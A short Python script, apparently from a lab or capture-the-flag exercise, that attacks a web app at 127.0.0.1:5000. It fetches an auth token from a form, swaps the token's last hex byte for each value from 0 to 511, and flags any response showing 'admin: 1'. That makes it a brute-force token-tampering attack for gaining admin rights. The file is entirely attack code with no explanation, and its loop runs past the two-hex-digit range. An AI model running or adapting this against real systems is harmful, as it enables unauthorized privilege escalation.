#import urllib2
import urllib
from urllib.request import urlopen
import bs4

def hex2(x):
    v = hex(x)[2:]
    if len(v) % 2 == 1:
        return '0'+v
    else:
        return v
    
url = "http://127.0.0.1:5000/auth"
soup = bs4.BeautifulSoup(urlopen(url).read())
token = soup.find_all(attrs={"name":"token"})[0].attrs["value"]
url = url + "?token=" + token

good = list()
for i in range(0,512):
    nurl = url[:-2] + hex2(i)
    soup = bs4.BeautifulSoup(urlopen(nurl).read())
    v = [x for x in str(soup).splitlines() if "admin: 1" in x]    
    if len(v) > 0:
        print(nurl)
        good.append(nurl)
    else:
        print("fail")

print(good)
    


